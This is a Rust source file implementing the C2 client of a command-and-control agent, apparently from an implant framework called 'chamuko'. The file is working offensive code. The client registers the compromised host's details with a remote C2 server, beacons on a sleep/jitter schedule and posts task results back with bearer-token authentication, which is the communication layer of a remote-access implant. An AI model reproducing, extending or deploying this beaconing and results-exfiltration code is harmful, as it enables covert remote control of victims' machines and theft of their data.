use chamuko_protocol::{
    AgentInfo, BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest,
    TaskResult,
};

#[derive(Debug)]
pub enum C2Error {
    Http(String),
    Parse(String),
    /// Non-2xx response. `404` means the C2 no longer knows this agent.
    Status(u16, String),
}

impl C2Error {
    pub fn is_unknown_agent(&self) -> bool {
        matches!(self, Self::Status(404, _))
    }
}

impl std::fmt::Display for C2Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Http(e) => write!(f, "http error: {e}"),
            Self::Parse(e) => write!(f, "parse error: {e}"),
            Self::Status(code, body) => write!(f, "http status {code}: {body}"),
        }
    }
}

impl std::error::Error for C2Error {}

pub struct C2Client {
    base: String,
    token: Option<String>,
    agent: ureq::Agent,
}

impl C2Client {
    pub fn new(base: String, token: Option<String>) -> Self {
        let agent = ureq::AgentBuilder::new()
            .timeout_connect(std::time::Duration::from_secs(10))
            .timeout(std::time::Duration::from_secs(30))
            .build();
        Self {
            base,
            token,
            agent,
        }
    }

    fn url(&self, path: &str) -> String {
        let base = self.base.trim_end_matches('/');
        format!("{base}{path}")
    }

    fn post(&self, path: &str, body: &impl serde::Serialize) -> Result<ureq::Response, C2Error> {
        let payload = serde_json::to_value(body).map_err(|e| C2Error::Parse(e.to_string()))?;
        let mut request = self.agent.post(&self.url(path));
        if let Some(token) = &self.token {
            request = request.set("Authorization", &format!("Bearer {token}"));
        }
        request.send_json(payload).map_err(|e| match e {
            ureq::Error::Status(code, resp) => {
                C2Error::Status(code, resp.into_string().unwrap_or_default())
            }
            ureq::Error::Transport(t) => C2Error::Http(t.to_string()),
        })
    }

    fn parse<T: serde::de::DeserializeOwned>(resp: ureq::Response) -> Result<T, C2Error> {
        resp.into_json()
            .map_err(|e| C2Error::Parse(e.to_string()))
    }

    pub fn register(
        &self,
        info: &AgentInfo,
        sleep: u64,
        jitter: u64,
    ) -> Result<RegisterResponse, C2Error> {
        let resp = self.post(
            "/register",
            &RegisterRequest {
                agent: info.clone(),
                sleep: Some(sleep),
                jitter: Some(jitter),
            },
        )?;
        Self::parse(resp)
    }

    pub fn beacon(&self, id: &str) -> Result<BeaconResponse, C2Error> {
        let resp = self.post(
            "/beacon",
            &BeaconRequest {
                id: id.to_string(),
                timestamp: chamuko_protocol::now_secs(),
            },
        )?;
        Self::parse(resp)
    }

    pub fn post_results(&self, id: &str, results: Vec<TaskResult>) -> Result<(), C2Error> {
        if results.is_empty() {
            return Ok(());
        }
        self.post(
            "/results",
            &ResultsRequest {
                id: id.to_string(),
                results,
            },
        )?;
        Ok(())
    }
}
